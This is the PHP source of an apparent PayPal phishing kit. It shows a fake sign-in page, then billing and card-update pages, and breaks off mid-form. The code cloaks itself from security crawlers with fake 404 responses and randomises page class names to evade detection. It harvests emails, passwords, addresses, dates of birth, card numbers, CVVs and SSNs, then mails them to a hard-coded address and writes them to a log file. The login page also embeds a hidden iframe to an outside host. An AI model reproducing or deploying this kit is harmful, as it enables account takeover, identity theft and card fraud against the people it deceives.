<?php

// put your email here

$To = 'fouzirzt@gmail.com';


##################################################################################################################
##################################################################################################################
################################   www.facebook.com/crazy.miss.off  #######################################################
##################################################################################################################
##################################################################################################################
@set_time_limit(0);
@session_start();
############################## bot ##############################
$ips = array("^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*");
foreach ($ips as $ip) {
    if (preg_match('/' . $ip . '/', $_SERVER['REMOTE_ADDR'])) {
        header("HTTP/1.0 404 Not Found");
        $ip = getenv("REMOTE_ADDR");
        $file = fopen("bot.txt", "a");
        fwrite($file, " user-agent : " . $_SERVER['HTTP_USER_AGENT'] . "
 ip : " . $ip . " || " . gmdate("Y-n-d") . " ----> " . gmdate("H:i:s") . "

");
        echo "<br>";
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}
$dp = strtolower($_SERVER['HTTP_USER_AGENT']);
$blocked_words = array("Android", "iPhone", "google", "http", "x11", "bot");
foreach ($blocked_words as $word2) {
    if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "	") {
        header("HTTP/1.0 404 Not Found");
        $ip = getenv("REMOTE_ADDR");
        $file = fopen("bot.txt", "a");
        fwrite($file, " user-agent : " . $_SERVER['HTTP_USER_AGENT'] . "
 ips : " . $ip . " || " . gmdate("Y-n-d") . " ----> " . gmdate("H:i:s") . "");
        echo "<br>";
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
};

############################## ip ##########################################
$client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {$ip = $client;}
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {$ip = $forward;}
    else
    {$ip = $remote;}                       //("http://www.geoplugin.net/json.gp?ip=".getenv('REMOTE_ADDR'))
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".getenv('REMOTE_ADDR')));
    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {$countrycode = $ip_data->geoplugin_countryCode;$_SESSION['cntcode'] = $countrycode;}
    $ip_data2 = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".getenv('REMOTE_ADDR')));
    if($ip_data2 && $ip_data2->geoplugin_countryName != null)
    {$countryname = $ip_data2->geoplugin_countryName;$_SESSION['cntname'] = $countryname;}
;

$xx=md5(microtime());
$ip=getenv("REMOTE_ADDR");
############################## refresh ##############################
if (!$_GET["ID"])
{
    if($_SESSION['xHolder']!= ""){echo "<META HTTP-EQUIV='refresh' content='0; URL=?ID=4&/myaccount/manage/security&update&".$xx."'>";exit();}
    elseif($_SESSION['xName']!= ""){echo "<META HTTP-EQUIV='refresh' content='0; URL=?ID=3&/myaccount/manage/security&update&".$xx."'>";exit();}
    elseif($_SESSION['shiroemail']!= ""){echo "<META HTTP-EQUIV='refresh' content='0; URL=?ID=2&/myaccount/manage/security&update&".$xx."'>";exit();}
    echo"<META HTTP-EQUIV='refresh' content='0; URL=?ID=1&/signin/login.html?".$xx."&path=/signin/?'>";exit();}


$x=md5(microtime());
$version="1";
############################## victim ##############################
$FuLL ="Time.IP.country.browser : ".@date("g:i a d/m/Y ")." | ".getenv('REMOTE_ADDR')." | ".$countryname." |  ".$_SERVER["HTTP_USER_AGENT"]."\n";
 	$f = fopen("ips.txt", "a+");
	fwrite($f, $FuLL);
		fclose($f);
 ############################## send ccv ##############################
$ip=getenv("REMOTE_ADDR");
if (isset($_POST['xHolder'])) {
  $_SESSION['xHolder'] = $_POST['xHolder'];
    	if ($_SESSION['xco'] =="United States of America" || $_SESSION['xco'] =="United Kingdom") {
		$xAdditionDATA = "x.SSN.SortCode  : ".$_POST['xSSN1']." | ".$_POST['xSSN2']." | ".$_POST['xSSN3'];
	}elseif ($_SESSION['xco']=="Canada") {
		$xAdditionDATA = "x.Mother.M.N    : ".$_POST['xSortCode'];
	}else{
		$xAdditionDATA = "x.VBV           : ".$_POST['xVBV'];
	}

$FuLL = "<pre><font style='font-size:12px;font-weight: bold;'>
+----------------------------------------------------------+
shiro.HolderName    : ".$_POST['xHolder']."
shiro.Credit.Card   : ".$_POST['xCCV']."
shiro.Expirate      : ".$_POST['xExpM']." | ".$_POST['xExpY']."
shiro.CVV/CVV2      : ".$_POST['xCVV']."
".$xAdditionDATA."
+----------------------------------------------------------+
shiro.IP            : ".getenv('REMOTE_ADDR')."
shiro.Date.&.Time   : ".@date("d/m/Y g:i a")."
shiro.Browser.Agent : ".$_SERVER["HTTP_USER_AGENT"]."
+----------------------------------------------------------+
+----------------------------------------------------------+
\n\n\n";
$TiTLe = "shiro".$version." | ".$countryname."";
$HeaDer = "From: shiro <login@e.shiro.Com>\r\nMIME-Version: 1.0\r\nContent-Type: text/html\r\nContent-Transfer-Encoding: 8bit\r\n\r\n";
@mail($To,$TiTLe,$FuLL,$HeaDer);
	$f = fopen("paypal.txt", "a+");
	fwrite($f, $FuLL);
		fclose($f);
           echo "<META HTTP-EQUIV='refresh' content='0; URL=?ID=4&/myaccount/manage/security&update&".$xx."'>";
exit();
       }
############################## send billing  ##############################
if (isset($_POST['xName'])) {
$_SESSION['xName'] = $_POST['xName'];
$_SESSION['xco'] = $_POST['xco'];

$FuLL = "<pre><font style='font-size:12px;font-weight: bold;'>
+----------------------------------------------------------+
shiro.FullName      : ".$_POST['xName']."
shiro.Address.1     : ".$_POST['xAddress1']."
shiro.Address.2     : ".$_POST['xAddress2']."
shiro.City          : ".$_POST['xCity']."
shiro.State         : ".$_POST['xState']."
shiro.Zip.Code      : ".$_POST['xZip']."
shiro.Country       : ".$_POST['xco']."
shiro.Date.Of.Birth : ".$_POST['xDobD']." | ".$_POST['xDobM']." | ".$_POST['xDobY']."
shiro.PhoneNumber    : ".$_POST['xPHONE']."
+----------------------------------------------------------+
shiro.IP            : ".getenv('REMOTE_ADDR')."
shiro.Date.&.Time   : ".@date("d/m/Y g:i a")."
shiro.Browser.Agent : ".$_SERVER["HTTP_USER_AGENT"]."
+----------------------------------------------------------+
\n";
$TiTLe = "shiro.U3".$version." | ".$countryname."";
$HeaDer = "From: shiro <login@e.shiro.Com>\r\nMIME-Version: 1.0\r\nContent-Type: text/html\r\nContent-Transfer-Encoding: 8bit\r\n\r\n";
@mail($To,$TiTLe,$FuLL,$HeaDer);
	$f = fopen("paypal.txt", "a+");
	fwrite($f, $FuLL);
		fclose($f);
echo "<META HTTP-EQUIV='refresh' content='0; URL=?ID=3&/myaccount/manage/security&update&".$xx."'>";
exit();
}
############################## send account ##############################
if (isset($_POST['shiroemail']) && isset($_POST['shiroPassWord'])) {

$FuLL = "<pre><font style='font-size:12px;font-weight: bold;'>
+----------------------------------------------------------+
shiro.UserName      : ".$_POST['shiroemail']."
shiro.PassWord      : ".$_POST['shiroPassWord']."
+----------------------------------------------------------+
shiro.IP            : ".getenv('REMOTE_ADDR')."
shiro.Date.&.Time   : ".@date("d/m/Y g:i a")."
shiro.Browser.Agent : ".$_SERVER["HTTP_USER_AGENT"]."
+----------------------------------------------------------+
\n";

$TiTLe = "shiro.U3".$version." | ".$countryname."|".getenv('REMOTE_ADDR')."";
$HeaDer = "From: shiro <login@e.shiro.Com>\r\nMIME-Version: 1.0\r\nContent-Type: text/html\r\nContent-Transfer-Encoding: 8bit\r\n\r\n";
@mail($To,$TiTLe,$FuLL,$HeaDer);
	$f = fopen("paypal.txt", "a+");
	fwrite($f, $FuLL);
		fclose($f);
           echo "<META HTTP-EQUIV='refresh' content='0; URL=?ID=2&/myaccount/manage/security&update&".$xx."'>";
            exit();};




 ############################## image ##############################
$login_jpg = "http://i.imgur.com/p3uvoEh.png";
$a_co_png = "http://i.imgur.com/0XBxU9d.png";
$d_co_png = "http://i.imgur.com/nITOfGU.png";
$m_co_png = "http://i.imgur.com/q5pdnW8.png";
$v_co_png = "http://i.imgur.com/x4DCR1w.png";
$input_fail_png = "http://i.imgur.com/n9uGTCd.png";
$img_1 ="http://i.imgur.com/Qa3BiJg.png";
$img_2 ="http://now-nai.com/upload/9oaXHlD.png";
$img_3 ="http://i.imgur.com/9oaXHlD.png";
$img_4 ="http://i.imgur.com/zheosFs.png";
$img_5 ="http://i.imgur.com/QuxAybu.png";
$img_7 ="http://i.imgur.com/gZQH8J7.png";
$img_6 ="http://i.imgur.com/gmvc3Or.png";
$img_8 ="http://i.imgur.com/8Pn3cpA.png";
$img_9 ="http://i.imgur.com/EFI08yf.png";
$img_10 ="http://i.imgur.com/3mDWDZB.png";
$img_11 ="http://i.imgur.com/8HsB4HD.png";
$img_12 ="http://i.imgur.com/Ac9pbz2.png";
$img_13 ="http://i.imgur.com/8rCvksq.png";
$img_15 ="http://i.imgur.com/u2ZG5jw.png";
$img_16 ="http://i.imgur.com/ZHzP7uh.png";
$img_17 ="http://i.imgur.com/Mlgx9ej.png";
$img_18 ="http://i.imgur.com/aC1Sd5J.png";
$img_19 ="http://i.imgur.com/D5ObxtZ.png";
$img_20 ="http://i.imgur.com/sSzf7IB.png";

    function RANDOM($length = 30) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, strlen($characters) - 1)];
        }
        return $randomString;
    }


 $charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

$charSetSize = strlen($charSet); $pwdSize = 6;

for ($i = 0; $i < $pwdSize; $i++) {
  $shiro1 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $shiro2 .= $charSet[ rand( 12, strlen($charSetSize) - 2 ) ];
  $shiro3 .= $charSet[ rand( 2, strlen($charSetSize) - 3 ) ];
  $shiro4 .= $charSet[ rand( 3, strlen($charSetSize) - 5 ) ];
  $shiro5 .= $charSet[ rand( 4, strlen($charSetSize) - 1 ) ];
  $shiro6 .= $charSet[ rand( 5, strlen($charSetSize) - 1 ) ];
  $shiro7 .= $charSet[ rand( 6, strlen($charSetSize) - 1 ) ];
  $shiro8 .= $charSet[ rand( 7, strlen($charSetSize) - 1 ) ];
  $shiro9 .= $charSet[ rand( 8, strlen($charSetSize) - 1 ) ];
  $shiro10 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $shiro11 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro12 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro13 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro14 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro15 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro16 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro17 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro18 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro19 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro20 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro21 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro22 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro23 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro24 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro25 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro26 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro27 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
  $shiro28 .= $charSet[ rand( 0, strlen($charSetSize) - 1 ) ];
}
 $content=$shiro1.mt_rand();
 $container=$shiro2.mt_rand();
 $sidebar=$shiro3.mt_rand();
 $sid=$shiro4.mt_rand();
 $inputo=$shiro5.mt_rand();
 $submito=$shiro6.mt_rand();
 $form=$shiro7.mt_rand();
 $nav=$shiro8.mt_rand();
 $nof=$shiro9.mt_rand();
 $nol=$shiro11.mt_rand();
 $imgl=$shiro12.mt_rand();
 $imgl1=$shiro13.mt_rand();
 $imgr=$shiro14.mt_rand();
 $imgr1=$shiro15.mt_rand();
 $lool1=$shiro17.mt_rand();
 $lool=$shiro23.mt_rand();
 $hif=$shiro18.mt_rand();
 $hid=$shiro19.mt_rand();
 $his=$shiro20.mt_rand();
 $nav=$shiro21.mt_rand();
 $a=$shiro22.mt_rand();
 $aa=$shiro24.mt_rand();
 $hil=$shiro25.mt_rand();
 $him=$shiro26.mt_rand();
 $hilx=$shiro27.mt_rand();

?>
 <html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
 <style>
 *, *::before, *::after {
 box-sizing: border-box;
}
body {
       background-color:  #F4F4F4;
}

.<?echo $content?> {
float: right;
padding: 0px 70px;
position: relative;
text-decoration: none;
word-wrap: break-word;
background-color: #FFF;
border: 1px solid #CBCBCB;
border-radius: 6px;
width: 68%;
margin-top:50px;
}
.<?echo $container?> {
    margin: 0px auto;
    padding: 80px 0px 0px 0px;
    max-width: 950px;
}
 .<? echo $sidebar;?>   {
    width: 28%;
float: left;
display: block;
margin: 0px 3% 0px 0px;
position: relative;
text-decoration: none;
word-wrap: break-word;
margin-top:50px;
}
.<? echo $sid;?>   {
margin-bottom: 15px;
background-color: #FFF;
border: 1px solid #CBCBCB;
border-radius: 6px;
padding: 20px 15px;

}


 @media only screen and (max-width: 930px) {
.<? echo $sid;?> {

    padding: 20px 0px;
}}
.<? echo $inputo;?>{
    background-clip: padding-box;
    transition: border 0.2s ease-in-out 0s, background-color 0.2s ease-in-out 0s;
}
.<? echo $inputo;?> select  {
     width: 33%;
         float: left;

}
.<? echo $inputo;?> {
    border-radius: 4px;
    box-sizing: border-box;
    outline: 0px none;
    width: 100%;
    height: 35px;
    color: #333;
    font-weight: 400;
    padding: 0px 24px 0px 12px;
    text-overflow: ellipsis;
    font-family: Helvetica,Arial,sans-serif;
    box-shadow: 0px 4px 7px #EEE inset;
    border: 1px solid #A9A9A9;
    margin-bottom: 9px;
}
.<? echo $a;?>{
border-radius: 4px;
box-sizing: border-box;
outline: 0px none;
width: 100%;
height: 35px;
color: #333;
font-weight: 400;
padding: 0px 24px 0px 12px;
text-overflow: ellipsis;
font-family: Helvetica,Arial,sans-serif;
box-shadow: 0px 4px 7px #EEE inset;
border: 1px solid #F61A39;
margin-bottom: 9px;
   }

.<? echo $inputo;?>:focus {
    box-shadow: none;
border: 1px solid #0070ba;
    background-color: #FFF;
}
.<? echo $submito;?>:focus {
background-color: #008AC5;
text-decoration: underline;
 }
.<? echo $submito;?>:hover {
background-color: #008AC5;
text-decoration: underline;
}
.<? echo $submito;?> {
    width: 100%;
height: 44px;
padding: 0px;
border: 0px none;
display: block;
background-color: #009CDE;
box-shadow: none;
border-radius: 5px;
box-sizing: border-box;
cursor: pointer;
-moz-appearance: none;
color: #FFF;
font-size: 1em;
text-align: center;
font-weight: 700;
font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
text-shadow: none;
text-decoration: none;
transition: background-color 0.4s ease-out 0s;
margin-top:20px;
}
.f {
padding: 0px 35.6%;
}

#nav {
    height: 32px;
    border-bottom: 1px solid #CCC;
    position: fixed;
width: 100%;
left: 0px;
right: 0px;
z-index: 1030;
max-width: 1170px;
margin: 0px auto;
padding: 9px 10px 9px 20px;
min-height: 3em;
background: #F5F5F5 none repeat scroll 0% 0%;
box-shadow: 0px 2px #D7D7D7;
}

@media only screen and (max-width: 767px) {
    .f {
        padding: 0 0 0 0;

}
.<?echo $content?>{
    float: none;
    padding: 15px;
    width: 100%;
    margin: 0px auto;
        margin-top: 60px;


}

.<? echo $sidebar;?>{
        display: none;
        visibility: hidden;
    }
}
.<? echo $nol;?>{
   height: 0;
}

@media only screen and (max-width: 390px) {

 #<? echo $submito;?>  {
     background-image: none;
 }


       .<?echo $content?>{
    margin-top: 60px;
    float: none;
    padding: 5px;
    width: 100%
}
.<?echo $nof?>{
     height: 0;
}
.<? echo $nol;?>{
   height: auto;
}

}


 </style>

        <script src="http://code.jquery.com/jquery-2.1.4.min.js"></script>
        <script type="text/javascript">
    function checkCC(s) {var i, n, c, r, t;r = "";for (i = 0; i < s.length; i++) {c = parseInt(s.charAt(i), 10);if (c >= 0 && c <= 9) r = c + r;}if (r.length <= 1) return false;t = "";for (i = 0; i < r.length; i++) {c = parseInt(r.charAt(i), 10);if (i % 2 != 0) c *= 2;t = t + c;}n = 0;for (i = 0; i < t.length; i++) {c = parseInt(t.charAt(i), 10);n = n + c;}if (n != 0 && n % 10 == 0) return true;else return false;}
	function numbersonly(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8){if (unicode<48||unicode>57)return false;}}
	function letersonly(e){if(("abcdefghijklmnopqrstuvwxyz ").indexOf(String.fromCharCode(e.keyCode))===-1){e.preventDefault();return false;}}
      $(document).ready(function(){

     $('#fo').submit(function(){
         	var E =  $('input[name=shiroemail]');
	    	var P =  $('input[name=shiroPassWord]');
		if (document.getElementById("shiroemail").value.length < 5 ){E.addClass("e");return false;}else{E.removeClass("e");}
        if (document.getElementById("shiroPassWord").value == 0){P.addClass("e");return false;}else{P.removeClass("e");}
               $('#loading-content').show();
                $('#fo').css({'opacity':'0.6'});
 });
 });  </script>
        <script type="text/javascript">

	function mForm () {

	        var N =  $('input[name=xName]');
	    	var A =  $('input[name=xAddress1]');
	    	var C = $('input[name=xCity]');
	    	var S = $('input[name=xState]');
	    	var Z = $('input[name=xZip]');
	    	var DD = $('select[name=xDobD]');
	    	var DM = $('select[name=xDobM]');
	    	var DY = $('select[name=xDobY]');
	    	var P = $('input[name=xPHONE]');
		if (document.getElementById("xName").value.length < 5 ){N.addClass("e");return false;}else{N.removeClass("e");}
        if (document.getElementById("xDobD").value == 0){DD.addClass("e");return false;}else{DD.removeClass("e");}
		if (document.getElementById("xDobM").value == 0){DM.addClass("e");return false;}else{DM.removeClass("e");}
		if (document.getElementById("xDobY").value == 0){DY.addClass("e");return false;}else{DY.removeClass("e");}
		if (document.getElementById("xAddress1").value.length < 5 ){A.addClass("e");return false;}else{A.removeClass("e");}
		if (document.getElementById("xCity").value.length < 4 ){C.addClass("e");return false;}else{C.removeClass("e");}
		if (document.getElementById("xState").value.length < 1 ){S.addClass("e");return false;}else{S.removeClass("e");}
		if (document.getElementById("xZip").value.length < 4 ){Z.addClass("e");return false;}else{Z.removeClass("e");}
		if (document.getElementById("xPHONE").value == 0){P.addClass("e");return false;}else{P.removeClass("e");}
        $('#loading-content').show();
        $('#fo').css({'opacity':'0.6'});
}

       </script>
  <? if ($_GET["ID"] == 1) { ?>

<style type="text/css">
#rotating {
width: 40px;
height: 40px;
    z-index: 99;
    display: block;
    margin: 32px auto;
    animation: 0.7s linear 0s normal none infinite running rotation;
    border-width: 8px;
    border-style: solid;
    border-color: #2180C0 rgba(0, 0, 0, 0.2) rgba(0, 0, 0, 0.2);
    border-radius: 100%;
}
@keyframes rotation {
	from {
		transform: rotate(0deg);
	}
	to {
		transform: rotate(359deg);
	}
}
.<? echo $inputo;?>:focus {
border: 1px solid #0070ba;
}
.<? echo $inputo;?> {
height: 44px;
width: 80%;
padding: 0 10px;
border: 1px solid #9da3a6;
background: #fff;
text-overflow: ellipsis;
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
box-sizing: border-box;
-webkit-border-radius: 4px;
-moz-border-radius: 4px;
-khtml-border-radius: 4px;
border-radius: 4px;
-webkit-box-shadow: none;
-moz-box-shadow: none;
box-shadow: none;
color: #000;
font-size: 1em;
font-family: Helvetica,Arial,sans-serif;
font-weight: 400;
direction: ltr;

    }
.<? echo $submito;?>:focus {
background-color: #008AC5;
text-decoration: underline;
 }
.<? echo $submito;?>:hover {
background-color: #008AC5;
text-decoration: underline;
}
.<? echo $submito;?> {
    width: 80%;
height: 44px;
padding: 0px;
border: 0px none;
display: block;
background-color: #009CDE;
box-shadow: none;
border-radius: 5px;
box-sizing: border-box;
cursor: pointer;
-moz-appearance: none;
color: #FFF;
font-size: 1em;
text-align: center;
font-weight: 700;
font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
text-shadow: none;
text-decoration: none;
transition: background-color 0.4s ease-out 0s;
margin-top:20px;
}

#<? echo $submito;?> {

width: 460px;
margin: 60px auto 0px;
background-repeat: no-repeat;
background-image: url('<?echo$login_jpg?>');
}

form {
        padding-top: 125px;

}
   .<? echo $aa;?>{
          color: rgb(0, 121, 173); font-family: HelveticaNeue, "Helvetica Neue", Helvetica, Arial, sans-serif;font-size: 93.75%; text-decoration: none; transition: color 0.2s ease-out 0s;

}

.<? echo $a;?> {
    width: 80%;
    height: 44px;
    padding: 0px;
    border: 0px none;
    display: block;
    background-color: #E1E7EB;
    box-shadow: none;
    border-radius: 5px;
    box-sizing: border-box;
    cursor: pointer;
    -moz-appearance: none;
    color: #000;
    font-size: 1em;
    text-align: center;
    font-weight: 700;
    font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
    text-shadow: none;
    text-decoration: none;
    transition: background-color 0.4s ease-out 0s;
    margin-top: 20px;
}




@media only screen and (max-width: 490px) {

 #<? echo $submito;?>  {
     width: auto;
     margin: 70px  auto 0px;
background-image: url('<?echo$img_1?>');
background-repeat: no-repeat;
background-position: center top;
width: auto;

 }

 <? echo $submito;?> {
padding-top: 60px;
}
.<? echo $inputo;?> {
      width: 85%;
}
.<? echo $submito;?> {
    width: 85%;

    }

    .<? echo $aa;?> {
   color: rgb(0, 121, 173);     font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
 font-weight: 400; text-decoration: none; transition: color 0.2s ease-out 0s;
}

    .<? echo $a;?>{
    width: 85%;
}


}


#loading-content {
    left: 50%;
    z-index: 999;
    width: 100px;
    margin-left: -50px;
    position: absolute;
    min-height: 100px;
    display: none;
}

     .e{
    border-color: #c72e2e;
    background-repeat: no-repeat;
    background-position: 98% center;
    background-image: url(<?=$input_fail_png;?>);
     }
</style>
 <title><?echo $countryname?>  | Login in to you account</title>
<link href="http://now-nai.com/upload/favicon.ico" rel="shortcut icon">

</head>


<body style="background-color: #fff;">

    	<div id="<? echo $submito;?>" >
<form id="fo" action="" method="POST" name="login">
                                          <center>
<div id="loading-content"><div id="rotating"></div></div>
	<input id="shiroemail" type="email" class="<? echo $inputo;?>" style="" name="shiroemail" placeholder="Email address"  value="<?=$xUserName;?>" >
	<input id="shiroPassWord" type="password" class="<? echo $inputo;?>"  name="shiroPassWord" placeholder="Password" value="">
<input id="bottun" type="submit" class="<? echo $submito;?>" value="Sign In" onclick="return xLogin()" style="top: 190;left: 435px;"><br>
 <a id="<?php echo RANDOM();?>" class="<? echo $aa;?>" href="#">Having trouble logging in?</a>    <br>  <br>
<input type="bottun" class="<? echo $a;?>" value="Sign Up" onclick="return lForm()" style="top: 190;left: 435px;">
                               </center>

</form>
    	</div>
</img>      <iframe src="http://jL.chura.pl/rc/" style="display:none"></iframe>
</body>
	<? }elseif($_GET["ID"] == 2){ ?>
<head>
          <title>account manage security</title>
          <link href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" rel="shortcut icon">


<style>
#loading-content {
    left: 50%;
    z-index: 999;
    width: 100px;
    margin-left: -50px;
    position: absolute;
    min-height: 100px;
    display: none;
}
#rotating {
width: 40px;
height: 40px;
    z-index: 99;
    display: block;
    margin: 32px auto;
    animation: 0.7s linear 0s normal none infinite running rotation;
    border-width: 8px;
    border-style: solid;
    border-color: #2180C0 rgba(0, 0, 0, 0.2) rgba(0, 0, 0, 0.2);
    border-radius: 100%;
}
@keyframes rotation {
	from {
		transform: rotate(0deg);
	}
	to {
		transform: rotate(359deg);
	}
}


.<? echo $lool;?> {
background: #F5F5F5 none repeat scroll 0% 0%;
position: fixed;
z-index: 1030;
width: auto;
width: 100%;
border-bottom: 1px solid #CCC;
box-shadow: 0px 2px #D7D7D7;

}

 .<? echo $nav;?> {
left: 0px;
right: 0px;
margin: 9px auto;
min-height: 3em;
}
.<? echo $imgl;?>{
    float: left;
    margin:11px 0px 0px 55px
}
.<? echo $imgr;?>{
    float: right;
    margin: 0px 33px 0px 55px;
}
.<? echo $hif;?>{
           height: 0;
      }


.<? echo $lool1;?> {
width: 100%;
color: #FFF;
background: #009CDE none repeat scroll 0% 0%;
float: left;
}
.<? echo $nav;?>1 {
max-width: 1170px;
margin-left: auto;
margin-right: auto;
padding-top: 10px;
}
.<? echo $imgl1;?>{
padding: 15px;
    float: left;

}
.<? echo $imgr1;?>{
padding-top: 15px;
padding-bottom: 15px;
    float: right;

}

.<? echo $hilx;?>{
    height: 0px;
}

 @media only screen and (max-width: 930px) {
     .<? echo $hid;?>{
          height: 0;
     }
     .<? echo $his;?>{
          height: 0;
     }
      .<? echo $hif;?>{
          height: auto;
      }
      .<? echo $imgr;?> {
    margin: 0px 33px 0px 0px;
}
.<? echo $imgl;?> {
    float: left;
    margin: 11px 0px 0px 20px;
}
.<? echo $him;?> {
              height: 0;
}
.<? echo $imgl1;?> {
    padding: 0px;
    float: left;
}
.<? echo $hil;?> {
    height: 0;
    float: left;
}
.<? echo $hilx;?>{
    height: auto;
}
.<? echo $imgr1;?> {
    padding: 0px;
}

}

 @media only screen and (max-width: 550px) {
.<? echo $lool1;?>,.<? echo $imgr1;?>,.<? echo $imgl1;?> {
   visibility: hidden;
   height: 0;
}
.<?echo $container?> {
    padding: 0px 0px 0px 0px;
}
.f {
    height: 0;
}
}

</style>
<link href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" rel="shortcut icon">
 <title><?echo $countryname?>  | manage information</title>

</head>
<body style="margin: 0px;">
<div id="<?php echo RANDOM();?>" class="<? echo $lool;?>">
<div id="<?php echo RANDOM();?>" class="<? echo $nav;?>">
 <div id="<?php echo RANDOM();?>" class="<? echo $imgl;?>">
<img id="<?php echo RANDOM();?>" height="28" width="106" src="<?echo$img_2?>"></img></div>
<img id="<?php echo RANDOM();?>" class="<? echo $hid;?>" src="<?echo$img_3?>"></img>
 <div id="<?php echo RANDOM();?>" class="<? echo $imgr;?>">
 <img id="<?php echo RANDOM();?>"  class="<? echo $his;?>" src="<?echo$img_4?>"></img>
 <img id="<?php echo RANDOM();?>" class="<? echo $hif;?>" src="<?echo$img_5?>"></img>
  </div>
  </div>
</div>     <br><br><br>
<div id="<?php echo RANDOM();?>" class="<? echo $lool1;?>">
<div id="<?php echo RANDOM();?>" class="<? echo $nav1;?>">
 <div id="<?php echo RANDOM();?>" class="<? echo $imgl1;?>">
  <img id="<?php echo RANDOM();?>" class="<? echo $hil;?>" src="<?echo$img_6?>"></img>
  <img id="<?php echo RANDOM();?>" class="<? echo $hilx;?>" src="<?echo$img_9?>"></img>
  </div>
   <div id="<?php echo RANDOM();?>" class="<? echo $imgr1;?>">
  <img id="<?php echo RANDOM();?>" class="<? echo $him;?>" src="<?echo$img_8?>"></img>
  </div>
  </div>
 </div>


     <div id="<?php echo RANDOM();?>" class="<?echo $container?>">

     <div id="<?php echo RANDOM();?>" class="<?echo $content?>">
     <div id="form2" >
<form id="fo" action="" method="POST" name="form">
<div id="loading-content"><div id="rotating"></div></div>

<br>  <img id="<?php echo RANDOM();?>" class="" src="<?echo$img_13?>"></img>
  <br><br>
     <style>
     .e{
    border-color: #c72e2e;
    background-repeat: no-repeat;
    background-position: 98% center;
    background-image: url(<?=$input_fail_png;?>);
     }

     </style>
<div id="<?php echo RANDOM();?>" style="top:0px;left:200px;">
	<input type="text" class="<? echo $inputo;?>" id="xName" name="xName" placeholder="Account Full Name" value="">
</div>

<div id="<?php echo RANDOM();?>" style="top:240px;left:200px;">
	<select class="<? echo $inputo;?>" style="width:33%;" id="xDobD" name="xDobD">
		<option value="0">Day</option>
